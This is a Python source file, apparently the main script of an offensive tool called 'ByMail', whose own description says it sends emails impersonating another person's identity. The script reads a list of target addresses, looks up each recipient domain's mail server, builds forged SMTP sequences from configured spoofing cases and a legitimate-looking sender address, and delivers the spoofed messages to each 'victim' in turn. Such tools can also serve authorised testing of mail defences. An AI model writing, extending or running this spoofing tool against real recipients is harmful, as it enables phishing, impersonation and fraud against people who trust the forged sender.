import sys
import argparse
import signal
from pwn import *

from taser import printx

import config
import cases
from additional.common import *
from additional.sendmail import *
from tabulate import tabulate
from builder import Builder


cases = cases.cases
config = config.config


def def_handler(sig, frame):
    printx.colored("\n\n[-] Closing program...\n",fg="red")
    sys.exit(1)

# Ctrl+C
signal.signal(signal.SIGINT, def_handler)


def banner():
    printx.colored('''
    
======================================================================================                                                                                                                                                     
                        ______        ___  ___        _  _ 
                        | ___ \       |  \/  |       (_)| |
                        | |_/ / _   _ | .  . |  __ _  _ | |
                        | ___ \| | | || |\/| | / _` || || |
                        | |_/ /| |_| || |  | || (_| || || |
                        \____/  \__, |\_|  |_/ \__,_||_||_|
                                __/  |                     
                                |___/
======================================================================================                          
    ''', fg='blue')
    printx.colored("                               Version: v0.1.0", fg="purple")
    printx.colored("                               Author: @marcsabate7",fg= "purple")


def parse_args():
    print("\n")
    parser = argparse.ArgumentParser(
        description="DESCRIPTION: This script is used to send emails impersonating the identity of another person",usage="\n- python bymail.py   \n\n  ES NECESSARIO RELLENAR los siguientes ficheros para USAR la herramienta:\n\t- users.txt \n\t -body.txt\n\t- config.py \n ", epilog='\Example: \r\npython ' + sys.argv[0] + " -v True"
    )

    parser.add_argument('-v', required=False, default=False, type=bool,help='Show debug messages in the screen (True/False)')

    args = parser.parse_args()
    return args

def end_script():
    printx.colored("\n\n[-] Closing program...\n",fg="red")
    sys.exit(1)

def check_config(args):

    col_names = ["Option", "Value"]
    data = []
    mode = config['case_id']

    print("Configuration: \n")
    if mode.decode("utf-8") not in cases:
        printx.colored("[-] You need to set a valid mode, please select one from 'cases.py'",fg="red")
        end_script()
    data.append(["Mode ID", mode.decode("utf-8")])

    emails = read_user_emails()
    if len(emails) == 0:
        printx.colored("[-] Users file is empty",fg="red")
        end_script()
    data.append(["Total of users uploaded", len(emails)])

    tls_chiper = config["server_mode"]["starttls"]
    data.append(["TLS chiper", tls_chiper])

    data.append(["Sending emails as", str(config["legitimate_site_address"].decode("utf-8"))])
    data.append(["Verbose mode", str(args.v)])

    print(tabulate(data, headers=col_names, tablefmt="fancy_grid"))


def main():
    banner()
    
    args = parse_args()
    check_config(args)

    print("\n")
    printx.colored("[+] Starting sending emails...\n")
    print("\n")
    
    emails = read_user_emails()

    last_victim_email = "victim@victim.com"

    for victim_email in emails:
        print("[+] Sending email to: "+'\033[1m' + str(victim_email) + '\033[0m')
        domain = victim_email.split("@")[1]
        mail_server_ip = get_mail_server_from_email_address(domain)
        
        mail_server_port = config["server_mode"]['recv_mail_server_port']
        starttls = config['server_mode']['starttls']

        builder_obj = Builder(cases,config,victim_email,last_victim_email)
        smtp_seqs = builder_obj.generate_smtp_seqs()

        message_content = smtp_seqs["msg_content"]

        send_mail = SendMail()
        send_mail.set_mail_info((mail_server_ip, mail_server_port),helo=smtp_seqs["helo"], mail_from=smtp_seqs["mailfrom"], rcpt_to =smtp_seqs["rcptto"], email_data=message_content, starttls=starttls,verbose = args.v)
        send_mail.send_email()
        last_victim_email = victim_email
        printx.colored("[✔] Email sent succesfully to: "+str(victim_email),fg="green")
        print("\n")
if __name__ == '__main__':
    main()